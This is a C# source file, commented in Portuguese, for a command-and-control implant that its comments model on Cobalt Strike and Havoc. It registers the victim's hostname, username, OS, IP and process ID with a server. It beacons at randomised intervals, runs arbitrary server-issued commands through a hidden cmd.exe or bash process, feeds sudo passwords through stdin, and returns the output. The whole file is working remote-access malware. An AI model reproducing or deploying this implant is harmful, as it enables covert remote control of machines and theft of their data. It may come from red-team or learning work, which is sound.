using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Net.NetworkInformation;

class Agent
{
    // Configuração do servidor e beacon
    static readonly string SERVER_URL    = "http://localhost:3000";
    static readonly int    BEACON_MIN_MS = 5000;
    static readonly int    BEACON_MAX_MS = 12000;
    static readonly int    CMD_TIMEOUT_MS = 30000;

    static readonly HttpClient http = new HttpClient();
    static string agentId    = "";
    static string agentToken = "";

    // O agente mantém o diretório atual internamente,
    // assim como Cobalt Strike e Havoc fazem.
    // Começa no diretório onde o agente foi executado.
    static string currentDir = Directory.GetCurrentDirectory();

    static async Task Main(string[] args)
    {
        Console.WriteLine("[*] Agente iniciado...");
        Console.WriteLine($"[*] Diretório inicial: {currentDir}");

        await Register();
        if (string.IsNullOrEmpty(agentId) || string.IsNullOrEmpty(agentToken))
        {
            Console.WriteLine("[-] Falha ao registrar. Encerrando.");
            return;
        }

        Console.WriteLine($"[+] Registrado com ID: {agentId}");

        // Loop de beacon
        while (true)
        {
            try
            {
                await Register();

                var tasks = await GetTasks();

                foreach (var task in tasks)
                {
                    string taskId  = task.GetProperty("_id").GetString() ?? "";
                    string command = task.GetProperty("command").GetString() ?? "";
                    string stdin   = task.TryGetProperty("stdin", out var stdinProp)
                                     ? stdinProp.GetString() ?? "" : "";

                    Console.WriteLine($"[>] Executando: {command}");

                    // Processa o comando e obtém o resultado
                    string output = HandleCommand(command, stdin);

                    await SendResult(taskId, output);
                    Console.WriteLine($"[+] Resultado enviado para tarefa {taskId}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Erro no beacon: {ex.Message}");
            }

            var rng   = new Random();
            int delay = rng.Next(BEACON_MIN_MS, BEACON_MAX_MS);
            Console.WriteLine($"[*] Aguardando {delay / 1000}s...");
            Thread.Sleep(delay);
        }
    }

    // HandleCommand decide se o comando é tratado internamente ou executado no shell.
    // Comandos internos (cd, pwd) são resolvidos pelo próprio agente sem criar
    // nenhum processo, reduzindo ruído no sistema.
    static string HandleCommand(string command, string stdin = "")
    {
        string trimmed = command.Trim();

        // CD: comando interno, muda o diretório do agente
        // Não cria processo nenhum, apenas atualiza a variável currentDir.
        // É assim que frameworks reais fazem: o estado vive no agente.
        if (trimmed == "cd" || trimmed.StartsWith("cd "))
        {
            return BuiltinCd(trimmed);
        }

        // PWD: retorna o diretório atual sem criar processo
        if (trimmed == "pwd")
        {
            return currentDir;
        }

        // Qualquer outro comando vai pro shell, usando currentDir como WorkingDirectory
        return ExecuteCommand(trimmed, stdin);
    }

    // Implementação do cd interno.
    // Resolve o caminho usando Path.GetFullPath, que trata:
    //   - caminhos absolutos (/tmp, C:\Users)
    //   - caminhos relativos (../foo, subdir)
    //   - "~" como atalho para home
    //   - "cd" sem argumento volta pro home
    static string BuiltinCd(string command)
    {
        // Extrai o destino: "cd /tmp" → "/tmp", "cd" → home
        string target = command.Length > 2 ? command.Substring(3).Trim() : "";

        // Sem argumento ou "~" → vai para o home do usuário
        if (string.IsNullOrEmpty(target) || target == "~")
        {
            target = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        }
        // "~/" → expande para home + resto do caminho
        else if (target.StartsWith("~/") || target.StartsWith("~\\"))
        {
            string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            target = Path.Combine(home, target.Substring(2));
        }

        // Path.GetFullPath resolve caminhos relativos baseando-se no currentDir.
        // Ex: currentDir="/home/user", target="../tmp" → "/home/tmp"
        string resolved = Path.GetFullPath(target, currentDir);

        // Verifica se o diretório realmente existe no filesystem
        if (!Directory.Exists(resolved))
        {
            return $"cd: {target}: Diretório não encontrado";
        }

        // Atualiza o estado interno do agente
        currentDir = resolved;
        return currentDir;
    }

    // Executa um comando no shell do sistema.
    // Sempre usa currentDir como WorkingDirectory, garantindo que
    // o comando roda no diretório certo mesmo sendo um processo novo.
    static string ExecuteCommand(string command, string stdin = "")
    {
        try
        {
            bool isWindows = System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                System.Runtime.InteropServices.OSPlatform.Windows);

            // Se tem stdin e é comando sudo, injeta flag -S
            // para que o sudo leia a senha do stdin ao invés do terminal
            string finalCommand = command;
            if (!string.IsNullOrEmpty(stdin) && command.StartsWith("sudo"))
            {
                if (!command.Contains("-S"))
                    finalCommand = "sudo -S " + command.Substring(4).TrimStart();
            }

            var proc = new Process();
            proc.StartInfo.FileName  = isWindows ? "cmd.exe" : "/bin/bash";
            proc.StartInfo.Arguments = isWindows
                ? $"/c {finalCommand}"
                : $"-c \"{finalCommand}\"";

            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError  = true;
            proc.StartInfo.RedirectStandardInput  = !string.IsNullOrEmpty(stdin);
            proc.StartInfo.UseShellExecute        = false;
            proc.StartInfo.CreateNoWindow         = true;

            // O diretório de trabalho sempre é o currentDir do agente
            proc.StartInfo.WorkingDirectory = currentDir;

            proc.Start();

            // Escreve no stdin do processo (ex: senha do sudo)
            if (!string.IsNullOrEmpty(stdin))
            {
                proc.StandardInput.WriteLine(stdin);
                proc.StandardInput.Close();
            }

            string output = proc.StandardOutput.ReadToEnd()
                          + proc.StandardError.ReadToEnd();

            // Timeout: se o comando travar (ex: comando interativo),
            // mata o processo e retorna o que já foi capturado
            if (!proc.WaitForExit(CMD_TIMEOUT_MS))
            {
                proc.Kill();
                return output + "\n[timeout: comando excedeu 30s]";
            }

            return string.IsNullOrWhiteSpace(output)
                ? "[comando executado sem output]"
                : output;
        }
        catch (Exception ex)
        {
            return $"[erro ao executar]: {ex.Message}";
        }
    }

    // Registra no servidor enviando informações da máquina.
    // Inclui o currentDir para que o dashboard possa exibir
    // onde o agente está navegando.
    static async Task Register()
    {
        var payload = new
        {
            hostname = Environment.MachineName,
            username = Environment.UserName,
            os       = Environment.OSVersion.ToString(),
            ip       = GetLocalIP(),
            arch     = Environment.Is64BitOperatingSystem ? "x64" : "x86",
            pid      = Environment.ProcessId,
            token    = string.IsNullOrEmpty(agentToken) ? null : agentToken,
            cwd      = currentDir
        };

        string json     = JsonSerializer.Serialize(payload);
        var    content  = new StringContent(json, Encoding.UTF8, "application/json");
        var    response = await http.PostAsync($"{SERVER_URL}/api/agents/register", content);
        string body     = await response.Content.ReadAsStringAsync();

        var doc   = JsonDocument.Parse(body);
        var agent = doc.RootElement.GetProperty("agent");

        agentId    = agent.GetProperty("_id").GetString() ?? "";
        agentToken = agent.GetProperty("token").GetString() ?? "";
    }

    static async Task<JsonElement[]> GetTasks()
    {
        var request = new HttpRequestMessage(HttpMethod.Get, $"{SERVER_URL}/api/tasks/agent/{agentId}");
        request.Headers.Add("x-api-token", agentToken);

        var response = await http.SendAsync(request);
        string body  = await response.Content.ReadAsStringAsync();

        var doc = JsonDocument.Parse(body);
        return doc.RootElement.EnumerateArray().ToArray() ?? Array.Empty<JsonElement>();
    }

    static async Task SendResult(string taskId, string output)
    {
        var payload = new { output };
        string json    = JsonSerializer.Serialize(payload);
        var    content = new StringContent(json, Encoding.UTF8, "application/json");

        var request = new HttpRequestMessage(HttpMethod.Put, $"{SERVER_URL}/api/tasks/{taskId}/result");
        request.Headers.Add("x-api-token", agentToken);
        request.Content = content;

        await http.SendAsync(request);
    }

    static string GetLocalIP()
    {
        foreach (var iface in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (iface.OperationalStatus != OperationalStatus.Up) continue;
            if (iface.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;

            foreach (var addr in iface.GetIPProperties().UnicastAddresses)
            {
                if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    return addr.Address.ToString();
            }
        }
        return "unknown";
    }
}
